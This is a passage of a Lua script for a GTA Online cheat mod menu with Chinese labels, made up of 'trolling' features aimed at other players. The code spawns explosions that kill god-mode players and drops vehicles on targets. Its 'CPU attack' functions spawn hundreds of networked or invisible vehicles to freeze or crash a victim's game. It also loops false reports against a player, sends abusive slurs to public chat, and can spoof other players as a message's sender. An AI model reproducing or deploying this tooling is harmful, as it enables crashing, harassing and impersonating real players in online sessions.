        c.z = c.z + 10
        local spawnedufo = entities.create_object(ufo, c) --creates ufo
        util.yield(2000)
        c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
        util.yield(1000)
        entities.delete_by_handle(spawnedufo)
        menu.trigger_commands("freeze".. players.get_name(pid).. " off")
    end)

    menu.action(explosions, "匿名爆炸无敌", {}, "爆炸击杀无敌玩家[只能作用于小菜单上]", function() --anonym godmode exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        menu.trigger_commands("confuse".. players.get_name(pid).. " on")
        util.yield(10)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(10)
        menu.trigger_commands("confuse".. players.get_name(pid).. " off")
    end)

    menu.action(explosions, "爆炸无敌", {}, "爆炸击杀无敌玩家[只能作用于小菜单上]", function() --owned godmode exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        menu.trigger_commands("confuse".. players.get_name(pid).. " on")
        util.yield(10)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(10)
        menu.trigger_commands("confuse".. players.get_name(pid).. " off")
    end)

    menu.action(explosions, "高爆", {}, "对，你没有错", function() 
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, 0, 0)
        local defx = 0
        local defy = 0
        local defz = 0
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defx = defx + 2
        defy = defy + 2
        c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    end)
    menu.toggle(trolling, "强制镜头向前", {}, "强制镜头向前", function(toggle)
        menu.trigger_commands("confuse".. players.get_name(pid), toggle)
    end)

    menu.action(trolling, "强制进入自由模式任务", {}, "强制玩家进入自由模式任务", function()
        menu.trigger_commands("mission".. players.get_name(pid))
    end)
    menu.action(trolling, "将附近载具吸到他身上",{"magnet"}, "", function()
        local p_c = players.get_position(pid)
        for _, v in pairs(entities.get_all_vehicles_as_handles()) do 
            if not PED.IS_PED_A_PLAYER(VEHICLE.GET_PED_IN_VEHICLE_SEAT(v, -1, false)) then 
                local v_c = ENTITY.GET_ENTITY_COORDS(v)
                local c = {}
                c.x = (p_c.x - v_c.x)*2
                c.y = (p_c.y - v_c.y )*2
                c.z = (p_c.z - v_c.z)*2
                ENTITY.APPLY_FORCE_TO_ENTITY(v, 1, c.x, c.y, c.z, 0, 0, 0, 0, false, false, true, false, false)
            end
        end
    end)
    menu.action(trolling,"切碎他", {},"用直升飞机的螺旋桨对玩家进行砍杀.如果玩家在附近，效果最好.", function(click_type)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.z = coords['z']+2.5
        local hash = util.joaat("buzzard")
        request_model_load(hash)
        local heli = entities.create_vehicle(hash, coords, ENTITY.GET_ENTITY_HEADING(target_ped))
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, false)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
        ENTITY.SET_ENTITY_INVINCIBLE(heli, true)
        ENTITY.FREEZE_ENTITY_POSITION(heli, true)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(heli, true, true)
        ENTITY.SET_ENTITY_ROTATION(heli, 180, 0.0, ENTITY.GET_ENTITY_HEADING(target_ped), 0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(heli, coords.x, coords.y, coords.z, true, false, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
    end)
    pan = menu.list(trolling, "人字拖", {}, "")
    Ptools_PanTable = {}
   Ptools_PanCount = 1
   Ptools_FishPan = 20
   menu.action(pan, "刷人字拖", {}, "", function()
   menu.trigger_commands("anticrashcam on")
    local targetped = PLAYER.GET_PLAYER_PED(pid)
       local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)

       local hash = util.joaat("tug")
       STREAMING.REQUEST_MODEL(hash)
       while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end

       for i = 1, Ptools_FishPan do
           Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
           ----
           local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
           NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
           NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
           NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
           NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
           ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
           ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
           ----
           if SE_Notifications then
               util.toast("干！！！ " .. Ptools_PanCount)
           end
           Ptools_PanCount = Ptools_PanCount + 1
       end
   end)

   menu.slider(pan, "人字拖", {"friedfish"}, "人字拖数量", 1, 300, 20, 1, function(value)
       Ptools_FishPan = value
   end)

   menu.action(pan, "移除", {"rmpan"}, "Yep", function ()
       for x = 1, 5, 1 do
           for i = 1, #Ptools_PanTable do
               entities.delete_by_handle(Ptools_PanTable[i])
               util.yield(10)
           end
       end
       --
       Ptools_PanCount = 1
       Ptools_PanTable = {}
       STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))
       util.yield(800)
       menu.trigger_commands("anticrashcam off")
   end)
    menu.toggle(trolling, "观看玩家", {}, "观看玩家", function(toggle)
        menu.trigger_commands("spectate".. players.get_name(pid), toggle)
    end)
    menu.toggle(trolling,"循环举报", {}, "", function(on)
        spam = on
        while spam do
            if pid ~= players.user() then
                menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
                menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
            end
            util.yield()
        end
    end)
    local allfire = menu.list(trolling, '集火玩家', {}, '选择子弹类型来集火射击他')
    local mir = {weap = 'WEAPON_SNOWBALL', speed = 1000}
    local mirloop =  menu.toggle_loop(allfire, '类型:雪球', {'allfire'}, '开启集火', function ()
          local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
          local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
          local weap = util.joaat(mir.weap)
          Delcar(targets)
          WEAPON.REQUEST_WEAPON_ASSET(weap)
          MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z - 2.0, 200, 0, weap, 0, true, false, mir.speed)
          MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 1.0, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
          MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
          MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y , tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
          MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
          MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
          MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
          MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, mir.speed)
      
          if not players.exists(pid) then
              if set.alert then
                  util.toast('集火GOGOGO!')
              end
              util.stop_thread()
          end
      end)
      
     menu.list_action(allfire, '子弹类型', {''}, '选择子弹类型', allfirelist, function(weapsel, text)
          mir.weap = afWeap[weapsel]
          menu.set_menu_name(mirloop, '集火 ' ..': '.. text)
      end)
    
     local weaspeed = menu.slider(allfire, '射击速度', {''}, '', 100, 6000, 1000, 100, function (s)
          mir.speed = s
      end)
    
    menu.toggle_loop(trolling, "让他走路带火", {}, "跑起来吧！！!", function()
        local coords = players.get_position(pid)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        util.yield(65)
    end)

    menu.toggle_loop(trolling, "在他身上撒尿", {}, ":尿他就完事了:", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 1
        util.yield(65)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 79, 0, false, false, 0, false)
    end)
    
    local explosion_circle_angle = 0
    menu.toggle_loop(trolling, "爆炸圈", {}, "在他周围生成爆炸圈", function ()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        explosion_circle(ped, explosion_circle_angle, 25)
        explosion_circle_angle += 0.15

        util.yield(50)
    end)
    menu.action(trolling, "圈养他", {""}, "", function(on_click)
        guanbilongzi(pid)
    end)
    ystgbyd = menu.list(trolling, "压死他个byd", {"asc"}, "")
    menu.action(ystgbyd, "压他就完事了", {"crush"}, "速度快，如果目标正在移动或远离，可能会出现故障和未命中.", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z'] + 20.0
        request_model(1917016601)
        local truck = entities.create_vehicle(1917016601, coords, 0.0)
        local vel = ENTITY.GET_ENTITY_VELOCITY(vel)
        ENTITY.SET_ENTITY_VELOCITY(truck, vel['x'], vel['y'], -100.0)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 3)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(truck, true)
		wait(2000)
		entities.delete_by_handle(truck)
    end)
    menu.action(ystgbyd, "小绵羊", {"crush2"}, "如果你的目标站在灯杆旁边或卡车可能错过的其他情况下，发出一声嘶嘶声来粉碎它们.", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z'] + 20.0
        request_model(util.joaat("faggio2"))
        local truck = entities.create_vehicle(util.joaat("faggio2"), coords, 0.0)
        local vel = ENTITY.GET_ENTITY_VELOCITY(vel)
        ENTITY.SET_ENTITY_VELOCITY(truck, vel['x'], vel['y'], -200.0)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 3)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(truck, true)
		wait(2000)
		entities.delete_by_handle(truck)
    end)
	
	menu.action(ystgbyd, "小丑车", {"crush3"}, "让他们看看他们是小丑", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z'] + 20.0
        request_model(util.joaat("speedo2"))
        local truck = entities.create_vehicle(util.joaat("speedo2"), coords, 0.0)
        local vel = ENTITY.GET_ENTITY_VELOCITY(vel)
        ENTITY.SET_ENTITY_VELOCITY(truck, vel['x'], vel['y'], -200.0)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 3)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(truck, true)
		wait(2000)
		entities.delete_by_handle(truck)
    end)

	menu.action(ystgbyd, "隐形车", {"crush4"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z'] + 20.0
        request_model(1917016601)
        local truck = entities.create_vehicle(1917016601, coords, 0.0)
        local vel = ENTITY.GET_ENTITY_VELOCITY(vel)
        ENTITY.SET_ENTITY_VELOCITY(truck, vel['x'], vel['y'], -200.0)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 3)
		ENTITY.SET_ENTITY_VISIBLE(truck, false, 0)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(truck, true)
		wait(2000)
		entities.delete_by_handle(truck)
    end)

	menu.action(ystgbyd, "直接压倒", {"crush5"}, "让你见识见识压倒性的力量.", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z'] + 20.0
        request_model(util.joaat("faggio2"))
        local truck = entities.create_vehicle(util.joaat("faggio2"), coords, 0.0)
        local vel = ENTITY.GET_ENTITY_VELOCITY(vel)
        ENTITY.SET_ENTITY_VELOCITY(truck, vel['x'], vel['y'], -200.0)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 3)
		ENTITY.SET_ENTITY_VISIBLE(truck, false, 0)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(truck, true)
		wait(2000)
		entities.delete_by_handle(truck)
    end)
    CPUhit = menu.list(trolling, "CPU攻击", {}, "尝试攻击他的cpu", function(); end)


    menu.action(CPUhit,"刷实体", {}, "开始攻击", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		menu.trigger_commands("anticrashcamera off")
	end)
fish_options = menu.list(CPUhit, "CPU V1", {}, "")

	menu.divider(fish_options, "炸鱼")
	
    Ptools_PanTable = {}
    Ptools_PanCount = 1
    Ptools_FishPan = 20

    menu.action(fish_options, "炸鱼", {""}, "卡死", function ()
        local targetped = PLAYER.GET_PLAYER_PED(pid)
        local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)

        local hash = util.joaat("tug")
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end

        for i = 1, Ptools_FishPan do
            Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
            ----
            local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
            ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
            ----
            if SE_Notifications then
                util.toast("Spawned with index of " .. Ptools_PanCount)
            end
            Ptools_PanCount = Ptools_PanCount + 1
        end
    end)


    menu.slider(fish_options, "数量", {""}, "鱼的数量1-300", 1, 300, 20, 1, function(value)
        Ptools_FishPan = value
    end)

    menu.action(fish_options, "删除", {""}, "Yep", function ()
        for x = 1, 5, 1 do
            for i = 1, #Ptools_PanTable do
                entities.delete_by_handle(Ptools_PanTable[i])
                util.yield(10)
            end
        end
        --
        Ptools_PanCount = 1
        Ptools_PanTable = {}
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))
    end)
	
menu.action(CPUhit,"CPU V2", {}, "CPU v2", function() 
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		notification("开始干他", colors.black)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("干完", colors.green) 
		menu.trigger_commands("anticrashcamera off")
		util.yield(5000)
	end)

    menu.action(CPUhit,"CPU V3", {}, "CPU v3", function() 
		while not STREAMING.HAS_MODEL_LOADED(-305727417) do
			STREAMING.REQUEST_MODEL(-305727417)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
		notification("开始干他", colors.blue)
        menu.trigger_commands("violentfreeze" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("rockets" .. PLAYER.GET_PLAYER_NAME(pid))
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(-305727417, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("干完", colors.blue) 
        menu.trigger_commands("violentfreeze" .. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("rockets" .. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(5000)
	end)

    local sounds = menu.list(trolling, "声音恶搞", {}, "")
    menu.toggle_loop(sounds, "让他听到循环爆炸死亡声音", {}, "吵死了", function()
        local coords = players.get_position(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "BED", coords.x, coords.y, coords.z, "WASTEDSOUNDS", true, 5, false)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Crash", coords.x, coords.y, coords.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 5, false)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "BASE_JUMP_PASSED", coords.x, coords.y, coords.z, "HUD_AWARDS", true, 5, false)
        util.yield(20)
        util.toast("你真不是个人 :)")
    end)
    menu.toggle_loop(sounds, "循环死亡的声音", {}, "", function()
        local coords = players.get_position(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(1, "BED", coords.x, coords.y, coords.z, "WASTEDSOUNDS", true, 5, false)
        util.yield(5800)
    end)
    menu.toggle_loop(sounds, "循环游艇声音", {}, "", function()
        local coords = players.get_position(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Horn", coords.x, coords.y, coords.z, "DLC_Apt_Yacht_Ambient_Soundset", true, 5, false)
        util.yield(3000)
    end)
    menu.toggle_loop(sounds, "嗡嗡声", {}, "", function()
        local coords = players.get_position(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Crash", coords.x, coords.y, coords.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 5, false)
        util.yield(1700)
    end)
    menu.toggle_loop(sounds, "任务成功声音", {}, "", function()
        local coords = players.get_position(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(1, "BASE_JUMP_PASSED", coords.x, coords.y, coords.z, "HUD_AWARDS", true, 5, false)
        util.yield(1250)
    end)
    local xuanbu = menu.list(trolling, "宣布", {}, "")
    menu.action(xuanbu, "在公屏宣布", {}, "", function()
    local basedLevel = math.random(100)
    local basedPercentage = players.get_name(pid).. " Is ".. basedLevel.. "% based"
    chat.send_message(basedPercentage, false, true, true)
    util.toast("傻逼 别点了 操你妈的")
    end)
    menu.action(xuanbu, "在公屏说他是傻逼", {}, "公屏说他是傻逼", function() 
    local kys = "臭鸡巴 " .. players.get_name(pid) .. ' 死傻逼操你妈/Fuck you, idiot' 
    chat.send_message(kys, false, true, true)
    end)

end)
      local function set_menu_open(toggle) end 
      local menu_is_open = false
      local function input_handler()
          if menu.is_open() then return end
          local VK_NUMPAD8 = 0x68
          local VK_NUMPAD2 = 0x62
          if util.is_key_down(VK_NUMPAD2) then
              selected_index = selected_index + 1
          elseif util.is_key_down(VK_NUMPAD8) then
              selected_index = selected_index - 1
          end
      end
      
      local function tick_handler()
          if menu_is_open then
              render_menu()
          end
          input_handler()
          return true
      end
      blur_rect_instance = directx.blurrect_new()
      util.create_tick_handler(tick_handler) 
LangName = {}
PlayerSpooflist = {}
vehicle_uses = 0
ped_uses = 0
pickup_uses = 0
player_uses = 0
object_uses = 0
robustmode = false
reap = false
menu.toggle(TRANROOT, "开关", {"yuyanopen"}, '', function(on) 
	run = on
end, true)
targetlangmenu = menu.slider_text(TRANROOT, "目标语言", {}, "单击以应用更改", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)
tradlocamenu = menu.slider_text(TRANROOT, "传输消息的位置", {}, "单击以应用更改", {"无网络团队聊天", "联网团队聊天", "未联网全部聊天", "联网全部聊天", "通知（从前从前推荐）"}, function(s)
	Tradloca = s
end)
menu.toggle(TRANROOT, "传输自己", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(TRANROOT, "即使语言与所需语言相同，也要进行传输", {}, "可能无法正常工作，因为谷歌是愚蠢的", function(on)
	traductsamelang = on	
end)
traductmymessage = menu.list(TRANROOT, "发送传输的消息")
finallangmenu = menu.slider_text(traductmymessage, "最终语言", {"finallang"}, "您留言的最终语言.																	  单击以应用更改", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)
spoofsend = menu.slider_text(traductmymessage, "伪装为", {"Spoofas"}, "默认为自己.											  单击以应用更改", PlayerSpooflist, function(s)
	spoofingas = PlayerSpoof[s]
end)
menu.action(traductmymessage, "发送消息", {"Sendmessage"}, "输入文本 为您的消息", function(on_click)
    util.toast("请输入您的消息")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, spoofingas,string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
ran = 0
chat.on_message(function(packet_sender, message_sender, text, team_chat)
if run  then
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
		async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
			if Sucess ~= "" then
				translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
				if not traductsamelang and (sourceLang == targetlang)then
				else
					if (Tradloca == 1) then	
						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), true, true, false)
					end if (Tradloca == 2) then
						botsend = true
						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), true, true, true)
					end if (Tradloca == 3) then
						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), false, true, false)
					end if (Tradloca == 4) then
						botsend = true
						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), false, true, true)
					end if (Tradloca == 5) then
						util.toast(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), TOAST_ALL)
					end
				end
			end
		end)
		async_http.dispatch()
		end
	end
	botsend = false
	end
end)

--players.on_join(function(pid)
	--PlayerSpooflist[pid] = players.get_name(pid)
	--PlayerSpoof[pid] = pid
	--menu.set_action_slider_options(spoofsend, PlayerSpooflist)
	--if (pid == players.user()) then
		--spoofingas = pid
	--	menu.set_value(spoofsend, pid)
	--end
--end)
--players.dispatch_on_join()

--players.on_leave(function(pid)
	--PlayerSpooflist[pid] = nil
	--PlayerSpoof[pid] = nil
	--menu.set_action_slider_options(spoofsend, PlayerSpooflist)
--end)
LangKeys = {}
LangLookupByName = {}
local run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end
menu.action(qita, "赌一手", {}, "点击进行博弈！！！", function()
    ENTITY.APPLY_FORCE_TO_ENTITY(0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0)
    util.toast("等下就死机:)")
end)
menu.action(qita, "重新启动GTA", {}, "", function()
    CQ_MISC._RESTART_GAME()
end)
local Hcsound = "HintCamSounds"

local hide_name_toggle = menu.toggle(qita, "启动时隐藏用户名", {}, "隐藏将在欢迎语中显示的用户名.", function(state, click_type)
    if click_type ~= CLICK_BULK then
        settings.hide_name_on_script_startup = state
        saving_settings_to_file()
    end
end, settings.hide_name_on_script_startup)
constructorscript = menu.list(constructorscript00, "人物模型", {}, "在线功能选项")
constructorscript2 = menu.action(constructorscript, "加载模型选项", {""}, "", function()
    notification("正在加载模型脚本,请稍等",colors.red)
util.yield(2000)
    require "lib.cqcqlib.constructor"
    menu.delete(constructorscript2)
end)

Heist_Control = menu.list(renwuxx, "任务选项")
Heist_Control_Load = menu.action(Heist_Control, "加载任务选项", {""}, "", function()
notification("正在加载任务脚本,请稍等",colors.blue)
util.yield(2000)
    require "lib.cqcqlib.hc"
    menu.delete(Heist_Control_Load)
end)
    players.dispatch_on_join()
slaxdom = require("lib.cqcqlib.slaxdom")
slaxml = require("lib.cqcqlib.slaxml")
menyoovmain_root = menu.list(mod111, "载具列表", {"lancespoonermenyoovehicles"}, "目录中的所有载具！")--===========by lance spooner
menyoom_root = menu.list(mod111, "地图列表", {"lancespoonerallmaps"}, "目录中的所有地图")
menyoomloaded_root = menu.list(mod111, "当前加载的地图", {"lancespoonerloadedmaps"}, "已加载的地图")
